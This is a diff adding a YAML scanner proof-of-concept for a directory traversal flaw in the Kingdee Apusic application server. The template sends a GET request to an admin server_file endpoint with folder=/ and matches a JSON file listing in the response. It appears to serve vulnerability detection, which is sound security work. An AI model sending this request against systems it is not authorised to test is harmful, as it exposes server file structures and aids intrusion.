@@ -1,0 +1,15 @@
+name: poc-yaml-kingdee-apusic-server-file-traversal
+manual: true
+transport: http
+rules:
+  r0:
+    request:
+      cache: true
+      method: GET
+      path: /admin/protected/selector/server_file/files?folder=/
+    expression: response.status==200 && response.body.bcontains(b'"total":') && response.body.bcontains(b'"rows":') && response.body.bcontains(b'"name":') && response.body.bcontains(b'"path":') && response.body.bcontains(b'"folder":')
+expression: r0()
+detail:
+  author: klear
+  links:
+    - https://vuls.info/PeiQi/wiki/oa/%E9%87%91%E8%9D%B6OA/%E9%87%91%E8%9D%B6OA%20Apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%B8%AD%E9%97%B4%E4%BB%B6%20server_file%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/?h=apusic
